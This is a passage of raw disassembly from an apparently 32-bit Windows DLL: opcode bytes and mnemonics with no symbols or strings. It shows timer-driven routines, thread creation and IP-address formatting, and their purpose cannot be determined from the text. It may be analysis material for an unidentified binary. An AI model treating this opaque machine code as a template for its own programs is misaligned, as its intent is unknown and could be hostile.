1000bd33:	83 c0 04             	add    $0x4,%eax
1000bd36:	50                   	push   %eax
1000bd37:	6a 01                	push   $0x1
1000bd39:	ff 75 08             	pushl  0x8(%ebp)
1000bd3c:	ff 15 08 e0 00 10    	call   *0x1000e008
1000bd42:	5d                   	pop    %ebp
1000bd43:	c3                   	ret    
1000bd44:	56                   	push   %esi
1000bd45:	68 1c 01 00 00       	push   $0x11c
1000bd4a:	6a 00                	push   $0x0
1000bd4c:	be e0 36 01 10       	mov    $0x100136e0,%esi
1000bd51:	56                   	push   %esi
1000bd52:	e8 d3 1f 00 00       	call   0x1000dd2a
1000bd57:	83 c4 0c             	add    $0xc,%esp
1000bd5a:	56                   	push   %esi
1000bd5b:	c7 05 e0 36 01 10 1c 	movl   $0x11c,0x100136e0
1000bd62:	01 00 00 
1000bd65:	ff 15 20 e1 00 10    	call   *0x1000e120
1000bd6b:	5e                   	pop    %esi
1000bd6c:	c3                   	ret    
1000bd6d:	68 bc 36 01 10       	push   $0x100136bc
1000bd72:	68 b8 36 01 10       	push   $0x100136b8
1000bd77:	68 48 f2 00 10       	push   $0x1000f248
1000bd7c:	ff 35 d0 32 01 10    	pushl  0x100132d0
1000bd82:	e8 34 98 ff ff       	call   0x100055bb
1000bd87:	83 c4 10             	add    $0x10,%esp
1000bd8a:	c3                   	ret    
1000bd8b:	68 dc 36 01 10       	push   $0x100136dc
1000bd90:	68 d8 36 01 10       	push   $0x100136d8
1000bd95:	68 5c f2 00 10       	push   $0x1000f25c
1000bd9a:	ff 35 d0 32 01 10    	pushl  0x100132d0
1000bda0:	e8 16 98 ff ff       	call   0x100055bb
1000bda5:	83 c4 10             	add    $0x10,%esp
1000bda8:	c3                   	ret    
1000bda9:	56                   	push   %esi
1000bdaa:	33 f6                	xor    %esi,%esi
1000bdac:	e8 1b 00 00 00       	call   0x1000bdcc
1000bdb1:	85 c0                	test   %eax,%eax
1000bdb3:	74 13                	je     0x1000bdc8
1000bdb5:	e8 d1 ff ff ff       	call   0x1000bd8b
1000bdba:	85 c0                	test   %eax,%eax
1000bdbc:	74 0a                	je     0x1000bdc8
1000bdbe:	e8 aa ff ff ff       	call   0x1000bd6d
1000bdc3:	85 c0                	test   %eax,%eax
1000bdc5:	74 01                	je     0x1000bdc8
1000bdc7:	46                   	inc    %esi
1000bdc8:	8b c6                	mov    %esi,%eax
1000bdca:	5e                   	pop    %esi
1000bdcb:	c3                   	ret    
1000bdcc:	55                   	push   %ebp
1000bdcd:	8b ec                	mov    %esp,%ebp
1000bdcf:	51                   	push   %ecx
1000bdd0:	51                   	push   %ecx
1000bdd1:	56                   	push   %esi
1000bdd2:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000bdd5:	50                   	push   %eax
1000bdd6:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000bdd9:	50                   	push   %eax
1000bdda:	68 70 f2 00 10       	push   $0x1000f270
1000bddf:	ff 35 d0 32 01 10    	pushl  0x100132d0
1000bde5:	33 f6                	xor    %esi,%esi
1000bde7:	89 75 f8             	mov    %esi,-0x8(%ebp)
1000bdea:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000bded:	e8 c9 97 ff ff       	call   0x100055bb
1000bdf2:	83 c4 10             	add    $0x10,%esp
1000bdf5:	85 c0                	test   %eax,%eax
1000bdf7:	74 2c                	je     0x1000be25
1000bdf9:	83 7d fc 30          	cmpl   $0x30,-0x4(%ebp)
1000bdfd:	75 26                	jne    0x1000be25
1000bdff:	8b 75 f8             	mov    -0x8(%ebp),%esi
1000be02:	6a 20                	push   $0x20
1000be04:	56                   	push   %esi
1000be05:	68 88 36 01 10       	push   $0x10013688
1000be0a:	e8 01 1f 00 00       	call   0x1000dd10
1000be0f:	6a 10                	push   $0x10
1000be11:	83 c6 20             	add    $0x20,%esi
1000be14:	56                   	push   %esi
1000be15:	68 a8 36 01 10       	push   $0x100136a8
1000be1a:	e8 f1 1e 00 00       	call   0x1000dd10
1000be1f:	33 f6                	xor    %esi,%esi
1000be21:	83 c4 18             	add    $0x18,%esp
1000be24:	46                   	inc    %esi
1000be25:	8b c6                	mov    %esi,%eax
1000be27:	5e                   	pop    %esi
1000be28:	c9                   	leave  
1000be29:	c3                   	ret    
1000be2a:	55                   	push   %ebp
1000be2b:	8b ec                	mov    %esp,%ebp
1000be2d:	56                   	push   %esi
1000be2e:	8b 75 08             	mov    0x8(%ebp),%esi
1000be31:	e8 4d 06 00 00       	call   0x1000c483
1000be36:	33 c0                	xor    %eax,%eax
1000be38:	5e                   	pop    %esi
1000be39:	5d                   	pop    %ebp
1000be3a:	c2 04 00             	ret    $0x4
1000be3d:	55                   	push   %ebp
1000be3e:	8b ec                	mov    %esp,%ebp
1000be40:	51                   	push   %ecx
1000be41:	8b 45 08             	mov    0x8(%ebp),%eax
1000be44:	e8 4a 0d 00 00       	call   0x1000cb93
1000be49:	33 c0                	xor    %eax,%eax
1000be4b:	59                   	pop    %ecx
1000be4c:	5d                   	pop    %ebp
1000be4d:	c2 04 00             	ret    $0x4
1000be50:	55                   	push   %ebp
1000be51:	8b ec                	mov    %esp,%ebp
1000be53:	51                   	push   %ecx
1000be54:	8b 45 08             	mov    0x8(%ebp),%eax
1000be57:	e8 41 0d 00 00       	call   0x1000cb9d
1000be5c:	33 c0                	xor    %eax,%eax
1000be5e:	59                   	pop    %ecx
1000be5f:	5d                   	pop    %ebp
1000be60:	c2 04 00             	ret    $0x4
1000be63:	55                   	push   %ebp
1000be64:	8b ec                	mov    %esp,%ebp
1000be66:	51                   	push   %ecx
1000be67:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000be6b:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000be6e:	50                   	push   %eax
1000be6f:	6a 00                	push   $0x0
1000be71:	ff 75 08             	pushl  0x8(%ebp)
1000be74:	ff 75 0c             	pushl  0xc(%ebp)
1000be77:	6a 00                	push   $0x0
1000be79:	6a 00                	push   $0x0
1000be7b:	ff 15 54 e1 00 10    	call   *0x1000e154
1000be81:	85 c0                	test   %eax,%eax
1000be83:	74 07                	je     0x1000be8c
1000be85:	50                   	push   %eax
1000be86:	ff 15 50 e1 00 10    	call   *0x1000e150
1000be8c:	c9                   	leave  
1000be8d:	c2 08 00             	ret    $0x8
1000be90:	53                   	push   %ebx
1000be91:	56                   	push   %esi
1000be92:	57                   	push   %edi
1000be93:	8b d8                	mov    %eax,%ebx
1000be95:	e8 76 e9 ff ff       	call   0x1000a810
1000be9a:	8d bb 90 02 00 00    	lea    0x290(%ebx),%edi
1000bea0:	8d b3 10 03 00 00    	lea    0x310(%ebx),%esi
1000bea6:	57                   	push   %edi
1000bea7:	e8 03 f7 ff ff       	call   0x1000b5af
1000beac:	59                   	pop    %ecx
1000bead:	85 c0                	test   %eax,%eax
1000beaf:	74 32                	je     0x1000bee3
1000beb1:	66 83 3f 02          	cmpw   $0x2,(%edi)
1000beb5:	75 29                	jne    0x1000bee0
1000beb7:	0f b6 47 07          	movzbl 0x7(%edi),%eax
1000bebb:	50                   	push   %eax
1000bebc:	0f b6 47 06          	movzbl 0x6(%edi),%eax
1000bec0:	50                   	push   %eax
1000bec1:	0f b6 47 05          	movzbl 0x5(%edi),%eax
1000bec5:	50                   	push   %eax
1000bec6:	0f b6 47 04          	movzbl 0x4(%edi),%eax
1000beca:	50                   	push   %eax
1000becb:	68 2c e5 00 10       	push   $0x1000e52c
1000bed0:	81 c3 14 03 00 00    	add    $0x314,%ebx
1000bed6:	53                   	push   %ebx
1000bed7:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000bedd:	83 c4 18             	add    $0x18,%esp
1000bee0:	33 c0                	xor    %eax,%eax
1000bee2:	40                   	inc    %eax
1000bee3:	5f                   	pop    %edi
1000bee4:	5e                   	pop    %esi
1000bee5:	5b                   	pop    %ebx
1000bee6:	c3                   	ret    
1000bee7:	55                   	push   %ebp
1000bee8:	8b ec                	mov    %esp,%ebp
1000beea:	83 ec 10             	sub    $0x10,%esp
1000beed:	53                   	push   %ebx
1000beee:	57                   	push   %edi
1000beef:	8b be 00 04 00 00    	mov    0x400(%esi),%edi
1000bef5:	ff 15 40 e1 00 10    	call   *0x1000e140
1000befb:	8d 8f 40 77 1b 00    	lea    0x1b7740(%edi),%ecx
1000bf01:	33 db                	xor    %ebx,%ebx
1000bf03:	3b c1                	cmp    %ecx,%eax
1000bf05:	77 0a                	ja     0x1000bf11
1000bf07:	3b fb                	cmp    %ebx,%edi
1000bf09:	74 06                	je     0x1000bf11
1000bf0b:	43                   	inc    %ebx
1000bf0c:	e9 93 00 00 00       	jmp    0x1000bfa4
1000bf11:	8b be 9c 03 00 00    	mov    0x39c(%esi),%edi
1000bf17:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000bf1a:	50                   	push   %eax
1000bf1b:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000bf1e:	50                   	push   %eax
1000bf1f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000bf22:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000bf25:	89 5d f4             	mov    %ebx,-0xc(%ebp)
1000bf28:	89 5d f0             	mov    %ebx,-0x10(%ebp)
1000bf2b:	e8 17 7f ff ff       	call   0x10003e47
1000bf30:	85 c0                	test   %eax,%eax
1000bf32:	74 1d                	je     0x1000bf51
1000bf34:	ff 75 f8             	pushl  -0x8(%ebp)
1000bf37:	8b 86 98 03 00 00    	mov    0x398(%esi),%eax
1000bf3d:	ff 75 fc             	pushl  -0x4(%ebp)
1000bf40:	e8 3a b9 ff ff       	call   0x1000787f
1000bf45:	ff 75 fc             	pushl  -0x4(%ebp)
1000bf48:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000bf4b:	e8 c3 aa ff ff       	call   0x10006a13
1000bf50:	59                   	pop    %ecx
1000bf51:	8b be 9c 03 00 00    	mov    0x39c(%esi),%edi
1000bf57:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000bf5a:	50                   	push   %eax
1000bf5b:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000bf5e:	50                   	push   %eax
1000bf5f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000bf62:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000bf65:	e8 0c 7f ff ff       	call   0x10003e76
1000bf6a:	85 c0                	test   %eax,%eax
1000bf6c:	74 1d                	je     0x1000bf8b
1000bf6e:	ff 75 f8             	pushl  -0x8(%ebp)
1000bf71:	8b 86 98 03 00 00    	mov    0x398(%esi),%eax
1000bf77:	ff 75 fc             	pushl  -0x4(%ebp)
1000bf7a:	e8 52 ba ff ff       	call   0x100079d1
1000bf7f:	ff 75 fc             	pushl  -0x4(%ebp)
1000bf82:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000bf85:	e8 89 aa ff ff       	call   0x10006a13
1000bf8a:	59                   	pop    %ecx
1000bf8b:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
1000bf8e:	74 14                	je     0x1000bfa4
1000bf90:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
1000bf93:	74 0f                	je     0x1000bfa4
1000bf95:	33 db                	xor    %ebx,%ebx
1000bf97:	43                   	inc    %ebx
1000bf98:	ff 15 40 e1 00 10    	call   *0x1000e140
1000bf9e:	89 86 00 04 00 00    	mov    %eax,0x400(%esi)
1000bfa4:	5f                   	pop    %edi
1000bfa5:	8b c3                	mov    %ebx,%eax
1000bfa7:	5b                   	pop    %ebx
1000bfa8:	c9                   	leave  
1000bfa9:	c3                   	ret    
1000bfaa:	55                   	push   %ebp
1000bfab:	8b ec                	mov    %esp,%ebp
1000bfad:	83 ec 10             	sub    $0x10,%esp
1000bfb0:	53                   	push   %ebx
1000bfb1:	8b 1d 40 e1 00 10    	mov    0x1000e140,%ebx
1000bfb7:	33 c0                	xor    %eax,%eax
1000bfb9:	57                   	push   %edi
1000bfba:	8b be f4 03 00 00    	mov    0x3f4(%esi),%edi
1000bfc0:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000bfc3:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000bfc6:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000bfc9:	ff d3                	call   *%ebx
1000bfcb:	8d 8f 80 ee 36 00    	lea    0x36ee80(%edi),%ecx
1000bfd1:	3b c1                	cmp    %ecx,%eax
1000bfd3:	77 04                	ja     0x1000bfd9
1000bfd5:	85 ff                	test   %edi,%edi
1000bfd7:	75 55                	jne    0x1000c02e
1000bfd9:	8b 86 98 03 00 00    	mov    0x398(%esi),%eax
1000bfdf:	e8 f3 bf ff ff       	call   0x10007fd7
1000bfe4:	8b be 9c 03 00 00    	mov    0x39c(%esi),%edi
1000bfea:	50                   	push   %eax
1000bfeb:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000bfee:	50                   	push   %eax
1000bfef:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000bff2:	50                   	push   %eax
1000bff3:	e8 e5 7e ff ff       	call   0x10003edd
1000bff8:	85 c0                	test   %eax,%eax
1000bffa:	74 1d                	je     0x1000c019
1000bffc:	ff 75 f4             	pushl  -0xc(%ebp)
1000bfff:	8b 86 98 03 00 00    	mov    0x398(%esi),%eax
1000c005:	ff 75 fc             	pushl  -0x4(%ebp)
1000c008:	e8 6a ba ff ff       	call   0x10007a77
1000c00d:	ff 75 fc             	pushl  -0x4(%ebp)
1000c010:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c013:	e8 fb a9 ff ff       	call   0x10006a13
1000c018:	59                   	pop    %ecx
1000c019:	ff d3                	call   *%ebx
1000c01b:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
1000c01f:	89 86 f4 03 00 00    	mov    %eax,0x3f4(%esi)
1000c025:	74 07                	je     0x1000c02e
1000c027:	8b fe                	mov    %esi,%edi
1000c029:	e8 54 0e 00 00       	call   0x1000ce82
1000c02e:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c031:	5f                   	pop    %edi
1000c032:	5b                   	pop    %ebx
1000c033:	c9                   	leave  
1000c034:	c3                   	ret    
1000c035:	55                   	push   %ebp
1000c036:	8b ec                	mov    %esp,%ebp
1000c038:	ff 75 0c             	pushl  0xc(%ebp)
1000c03b:	ff 75 08             	pushl  0x8(%ebp)
1000c03e:	68 84 f2 00 10       	push   $0x1000f284
1000c043:	ff 35 d0 32 01 10    	pushl  0x100132d0
1000c049:	e8 6d 95 ff ff       	call   0x100055bb
1000c04e:	83 c4 10             	add    $0x10,%esp
1000c051:	5d                   	pop    %ebp
1000c052:	c2 08 00             	ret    $0x8
1000c055:	55                   	push   %ebp
1000c056:	8b ec                	mov    %esp,%ebp
1000c058:	83 ec 0c             	sub    $0xc,%esp
1000c05b:	53                   	push   %ebx
1000c05c:	56                   	push   %esi
1000c05d:	57                   	push   %edi
1000c05e:	8b d8                	mov    %eax,%ebx
1000c060:	8b 83 a4 03 00 00    	mov    0x3a4(%ebx),%eax
1000c066:	6a 03                	push   $0x3
1000c068:	59                   	pop    %ecx
1000c069:	e8 b9 f9 ff ff       	call   0x1000ba27
1000c06e:	8b f0                	mov    %eax,%esi
1000c070:	33 d2                	xor    %edx,%edx
1000c072:	8b ce                	mov    %esi,%ecx
1000c074:	89 55 f8             	mov    %edx,-0x8(%ebp)
1000c077:	e8 d4 f8 ff ff       	call   0x1000b950
1000c07c:	85 c0                	test   %eax,%eax
1000c07e:	75 47                	jne    0x1000c0c7
1000c080:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000c083:	50                   	push   %eax
1000c084:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000c087:	50                   	push   %eax
1000c088:	bf 98 f2 00 10       	mov    $0x1000f298,%edi
1000c08d:	57                   	push   %edi
1000c08e:	89 55 fc             	mov    %edx,-0x4(%ebp)
1000c091:	89 55 f4             	mov    %edx,-0xc(%ebp)
1000c094:	e8 8e 07 00 00       	call   0x1000c827
1000c099:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c09c:	85 c0                	test   %eax,%eax
1000c09e:	74 16                	je     0x1000c0b6
1000c0a0:	ff 75 fc             	pushl  -0x4(%ebp)
1000c0a3:	8b 7d f4             	mov    -0xc(%ebp),%edi
1000c0a6:	e8 e9 f8 ff ff       	call   0x1000b994
1000c0ab:	ff 75 fc             	pushl  -0x4(%ebp)
1000c0ae:	e8 60 a9 ff ff       	call   0x10006a13
1000c0b3:	59                   	pop    %ecx
1000c0b4:	eb 11                	jmp    0x1000c0c7
1000c0b6:	68 a0 f2 00 10       	push   $0x1000f2a0
1000c0bb:	57                   	push   %edi
1000c0bc:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c0c2:	e8 11 78 ff ff       	call   0x100038d8
1000c0c7:	8b ce                	mov    %esi,%ecx
1000c0c9:	e8 82 f8 ff ff       	call   0x1000b950
1000c0ce:	85 c0                	test   %eax,%eax
1000c0d0:	74 1a                	je     0x1000c0ec
1000c0d2:	e8 82 f8 ff ff       	call   0x1000b959
1000c0d7:	85 c0                	test   %eax,%eax
1000c0d9:	75 11                	jne    0x1000c0ec
1000c0db:	50                   	push   %eax
1000c0dc:	ff b3 b4 03 00 00    	pushl  0x3b4(%ebx)
1000c0e2:	8b fe                	mov    %esi,%edi
1000c0e4:	e8 f6 f8 ff ff       	call   0x1000b9df
1000c0e9:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c0ec:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c0ef:	5f                   	pop    %edi
1000c0f0:	5e                   	pop    %esi
1000c0f1:	5b                   	pop    %ebx
1000c0f2:	c9                   	leave  
1000c0f3:	c3                   	ret    
1000c0f4:	51                   	push   %ecx
1000c0f5:	83 b8 f0 03 00 00 00 	cmpl   $0x0,0x3f0(%eax)
1000c0fc:	75 07                	jne    0x1000c105
1000c0fe:	e8 52 ff ff ff       	call   0x1000c055
1000c103:	59                   	pop    %ecx
1000c104:	c3                   	ret    
1000c105:	33 c0                	xor    %eax,%eax
1000c107:	40                   	inc    %eax
1000c108:	59                   	pop    %ecx
1000c109:	c3                   	ret    
1000c10a:	56                   	push   %esi
1000c10b:	6a 20                	push   $0x20
1000c10d:	e8 d2 a8 ff ff       	call   0x100069e4
1000c112:	8b f0                	mov    %eax,%esi
1000c114:	59                   	pop    %ecx
1000c115:	85 f6                	test   %esi,%esi
1000c117:	74 0c                	je     0x1000c125
1000c119:	68 ac f2 00 10       	push   $0x1000f2ac
1000c11e:	56                   	push   %esi
1000c11f:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
1000c125:	8b c6                	mov    %esi,%eax
1000c127:	5e                   	pop    %esi
1000c128:	c3                   	ret    
1000c129:	56                   	push   %esi
1000c12a:	6a 30                	push   $0x30
1000c12c:	e8 b3 a8 ff ff       	call   0x100069e4
1000c131:	8b f0                	mov    %eax,%esi
1000c133:	59                   	pop    %ecx
1000c134:	85 f6                	test   %esi,%esi
1000c136:	74 0c                	je     0x1000c144
1000c138:	68 c8 f2 00 10       	push   $0x1000f2c8
1000c13d:	56                   	push   %esi
1000c13e:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
1000c144:	8b c6                	mov    %esi,%eax
1000c146:	5e                   	pop    %esi
1000c147:	c3                   	ret    
1000c148:	55                   	push   %ebp
1000c149:	8b ec                	mov    %esp,%ebp
1000c14b:	83 e4 f8             	and    $0xfffffff8,%esp
1000c14e:	83 ec 4c             	sub    $0x4c,%esp
1000c151:	83 64 24 08 00       	andl   $0x0,0x8(%esp)
1000c156:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
1000c15b:	53                   	push   %ebx
1000c15c:	56                   	push   %esi
1000c15d:	57                   	push   %edi
1000c15e:	be 00 20 00 00       	mov    $0x2000,%esi
1000c163:	56                   	push   %esi
1000c164:	e8 7b a8 ff ff       	call   0x100069e4
1000c169:	8b 3d 6c e0 00 10    	mov    0x1000e06c,%edi
1000c16f:	89 44 24 20          	mov    %eax,0x20(%esp)
1000c173:	f7 d8                	neg    %eax
1000c175:	1b c0                	sbb    %eax,%eax
1000c177:	23 c6                	and    %esi,%eax
1000c179:	59                   	pop    %ecx
1000c17a:	be e8 f2 00 10       	mov    $0x1000f2e8,%esi
1000c17f:	56                   	push   %esi
1000c180:	89 44 24 24          	mov    %eax,0x24(%esp)
1000c184:	ff d7                	call   *%edi
1000c186:	56                   	push   %esi
1000c187:	03 c0                	add    %eax,%eax
1000c189:	8d 74 24 20          	lea    0x20(%esp),%esi
1000c18d:	e8 36 fb ff ff       	call   0x1000bcc8
1000c192:	e8 73 ff ff ff       	call   0x1000c10a
1000c197:	8b d8                	mov    %eax,%ebx
1000c199:	89 5c 24 18          	mov    %ebx,0x18(%esp)
1000c19d:	85 db                	test   %ebx,%ebx
1000c19f:	74 12                	je     0x1000c1b3
1000c1a1:	53                   	push   %ebx
1000c1a2:	ff d7                	call   *%edi
1000c1a4:	03 c0                	add    %eax,%eax
1000c1a6:	53                   	push   %ebx
1000c1a7:	e8 1c fb ff ff       	call   0x1000bcc8
1000c1ac:	53                   	push   %ebx
1000c1ad:	e8 61 a8 ff ff       	call   0x10006a13
1000c1b2:	59                   	pop    %ecx
1000c1b3:	bb 2c f2 00 10       	mov    $0x1000f22c,%ebx
1000c1b8:	53                   	push   %ebx
1000c1b9:	6a 04                	push   $0x4
1000c1bb:	58                   	pop    %eax
1000c1bc:	8d 74 24 20          	lea    0x20(%esp),%esi
1000c1c0:	e8 03 fb ff ff       	call   0x1000bcc8
1000c1c5:	be 04 f3 00 10       	mov    $0x1000f304,%esi
1000c1ca:	56                   	push   %esi
1000c1cb:	ff d7                	call   *%edi
1000c1cd:	56                   	push   %esi
1000c1ce:	03 c0                	add    %eax,%eax
1000c1d0:	8d 74 24 20          	lea    0x20(%esp),%esi
1000c1d4:	e8 ef fa ff ff       	call   0x1000bcc8
1000c1d9:	e8 4b ff ff ff       	call   0x1000c129
1000c1de:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
1000c1e3:	89 44 24 10          	mov    %eax,0x10(%esp)
1000c1e7:	74 18                	je     0x1000c201
1000c1e9:	50                   	push   %eax
1000c1ea:	ff d7                	call   *%edi
1000c1ec:	ff 74 24 10          	pushl  0x10(%esp)
1000c1f0:	03 c0                	add    %eax,%eax
1000c1f2:	e8 d1 fa ff ff       	call   0x1000bcc8
1000c1f7:	ff 74 24 10          	pushl  0x10(%esp)
1000c1fb:	e8 13 a8 ff ff       	call   0x10006a13
1000c200:	59                   	pop    %ecx
1000c201:	53                   	push   %ebx
1000c202:	6a 04                	push   $0x4
1000c204:	58                   	pop    %eax
1000c205:	8d 74 24 20          	lea    0x20(%esp),%esi
1000c209:	e8 ba fa ff ff       	call   0x1000bcc8
1000c20e:	68 38 f3 00 10       	push   $0x1000f338
1000c213:	8d 74 24 44          	lea    0x44(%esp),%esi
1000c217:	e8 48 f4 ff ff       	call   0x1000b664
1000c21c:	80 7c 24 54 00       	cmpb   $0x0,0x54(%esp)
1000c221:	74 31                	je     0x1000c254
1000c223:	8b de                	mov    %esi,%ebx
1000c225:	e8 1c f5 ff ff       	call   0x1000b746
1000c22a:	8b 5c 24 4c          	mov    0x4c(%esp),%ebx
1000c22e:	be a0 f3 00 10       	mov    $0x1000f3a0,%esi
1000c233:	56                   	push   %esi
1000c234:	89 44 24 1c          	mov    %eax,0x1c(%esp)
1000c238:	ff d7                	call   *%edi
1000c23a:	56                   	push   %esi
1000c23b:	03 c0                	add    %eax,%eax
1000c23d:	8d 74 24 20          	lea    0x20(%esp),%esi
1000c241:	e8 82 fa ff ff       	call   0x1000bcc8
1000c246:	8b 44 24 18          	mov    0x18(%esp),%eax
1000c24a:	85 c0                	test   %eax,%eax
1000c24c:	74 06                	je     0x1000c254
1000c24e:	53                   	push   %ebx
1000c24f:	e8 74 fa ff ff       	call   0x1000bcc8
1000c254:	68 c0 f3 00 10       	push   $0x1000f3c0
1000c259:	8d 74 24 2c          	lea    0x2c(%esp),%esi
1000c25d:	e8 02 f4 ff ff       	call   0x1000b664
1000c262:	80 7c 24 3c 00       	cmpb   $0x0,0x3c(%esp)
1000c267:	74 31                	je     0x1000c29a
1000c269:	8b de                	mov    %esi,%ebx
1000c26b:	e8 d6 f4 ff ff       	call   0x1000b746
1000c270:	8b 5c 24 34          	mov    0x34(%esp),%ebx
1000c274:	be 04 f4 00 10       	mov    $0x1000f404,%esi
1000c279:	56                   	push   %esi
1000c27a:	89 44 24 1c          	mov    %eax,0x1c(%esp)
1000c27e:	ff d7                	call   *%edi
1000c280:	56                   	push   %esi
1000c281:	03 c0                	add    %eax,%eax
1000c283:	8d 74 24 20          	lea    0x20(%esp),%esi
1000c287:	e8 3c fa ff ff       	call   0x1000bcc8
1000c28c:	8b 44 24 18          	mov    0x18(%esp),%eax
1000c290:	85 c0                	test   %eax,%eax
1000c292:	74 06                	je     0x1000c29a
1000c294:	53                   	push   %ebx
1000c295:	e8 2e fa ff ff       	call   0x1000bcc8
1000c29a:	8b 44 24 24          	mov    0x24(%esp),%eax
1000c29e:	85 c0                	test   %eax,%eax
1000c2a0:	74 1d                	je     0x1000c2bf
1000c2a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000c2a5:	6a 03                	push   $0x3
1000c2a7:	ff 74 24 20          	pushl  0x20(%esp)
1000c2ab:	68 28 f4 00 10       	push   $0x1000f428
1000c2b0:	ff b1 9c 03 00 00    	pushl  0x39c(%ecx)
1000c2b6:	e8 7c 79 ff ff       	call   0x10003c37
1000c2bb:	89 44 24 14          	mov    %eax,0x14(%esp)
1000c2bf:	8d 44 24 28          	lea    0x28(%esp),%eax
1000c2c3:	e8 4f f4 ff ff       	call   0x1000b717
1000c2c8:	8d 44 24 40          	lea    0x40(%esp),%eax
1000c2cc:	e8 46 f4 ff ff       	call   0x1000b717
1000c2d1:	8b 45 08             	mov    0x8(%ebp),%eax
1000c2d4:	8b 74 24 14          	mov    0x14(%esp),%esi
1000c2d8:	ff 74 24 1c          	pushl  0x1c(%esp)
1000c2dc:	89 b0 fc 03 00 00    	mov    %esi,0x3fc(%eax)
1000c2e2:	e8 2c a7 ff ff       	call   0x10006a13
1000c2e7:	59                   	pop    %ecx
1000c2e8:	5f                   	pop    %edi
1000c2e9:	8b c6                	mov    %esi,%eax
1000c2eb:	5e                   	pop    %esi
1000c2ec:	5b                   	pop    %ebx
1000c2ed:	8b e5                	mov    %ebp,%esp
1000c2ef:	5d                   	pop    %ebp
1000c2f0:	c2 04 00             	ret    $0x4
1000c2f3:	55                   	push   %ebp
1000c2f4:	8b ec                	mov    %esp,%ebp
1000c2f6:	68 88 13 00 00       	push   $0x1388
1000c2fb:	ff 15 44 e1 00 10    	call   *0x1000e144
1000c301:	ff 75 08             	pushl  0x8(%ebp)
1000c304:	e8 3f fe ff ff       	call   0x1000c148
1000c309:	f7 d8                	neg    %eax
1000c30b:	1b c0                	sbb    %eax,%eax
1000c30d:	25 b1 fa ff ff       	and    $0xfffffab1,%eax
1000c312:	05 4f 05 00 00       	add    $0x54f,%eax
1000c317:	5d                   	pop    %ebp
1000c318:	c2 04 00             	ret    $0x4
1000c31b:	55                   	push   %ebp
1000c31c:	8b ec                	mov    %esp,%ebp
1000c31e:	51                   	push   %ecx
1000c31f:	56                   	push   %esi
1000c320:	33 f6                	xor    %esi,%esi
1000c322:	39 b0 fc 03 00 00    	cmp    %esi,0x3fc(%eax)
1000c328:	74 05                	je     0x1000c32f
1000c32a:	33 c0                	xor    %eax,%eax
1000c32c:	40                   	inc    %eax
1000c32d:	eb 2c                	jmp    0x1000c35b
1000c32f:	57                   	push   %edi
1000c330:	8d 4d fc             	lea    -0x4(%ebp),%ecx
1000c333:	51                   	push   %ecx
1000c334:	56                   	push   %esi
1000c335:	50                   	push   %eax
1000c336:	68 f3 c2 00 10       	push   $0x1000c2f3
1000c33b:	56                   	push   %esi
1000c33c:	56                   	push   %esi
1000c33d:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000c340:	ff 15 54 e1 00 10    	call   *0x1000e154
1000c346:	8b f8                	mov    %eax,%edi
1000c348:	3b fe                	cmp    %esi,%edi
1000c34a:	74 07                	je     0x1000c353
1000c34c:	57                   	push   %edi
1000c34d:	ff 15 50 e1 00 10    	call   *0x1000e150
1000c353:	33 c0                	xor    %eax,%eax
1000c355:	3b fe                	cmp    %esi,%edi
1000c357:	0f 95 c0             	setne  %al
1000c35a:	5f                   	pop    %edi
1000c35b:	5e                   	pop    %esi
1000c35c:	c9                   	leave  
1000c35d:	c3                   	ret    
1000c35e:	55                   	push   %ebp
1000c35f:	8b ec                	mov    %esp,%ebp
1000c361:	81 ec 3c 01 00 00    	sub    $0x13c,%esp
1000c367:	53                   	push   %ebx
1000c368:	56                   	push   %esi
1000c369:	8b d8                	mov    %eax,%ebx
1000c36b:	57                   	push   %edi
1000c36c:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
1000c372:	50                   	push   %eax
1000c373:	c7 85 c8 fe ff ff 14 	movl   $0x114,-0x138(%ebp)
1000c37a:	01 00 00 
1000c37d:	ff 15 20 e1 00 10    	call   *0x1000e120
1000c383:	83 bd cc fe ff ff 06 	cmpl   $0x6,-0x134(%ebp)
1000c38a:	73 07                	jae    0x1000c393
1000c38c:	33 c0                	xor    %eax,%eax
1000c38e:	e9 eb 00 00 00       	jmp    0x1000c47e
1000c393:	8b 83 a4 03 00 00    	mov    0x3a4(%ebx),%eax
1000c399:	6a 04                	push   $0x4
1000c39b:	59                   	pop    %ecx
1000c39c:	e8 86 f6 ff ff       	call   0x1000ba27
1000c3a1:	8b f0                	mov    %eax,%esi
1000c3a3:	33 d2                	xor    %edx,%edx
1000c3a5:	8b ce                	mov    %esi,%ecx
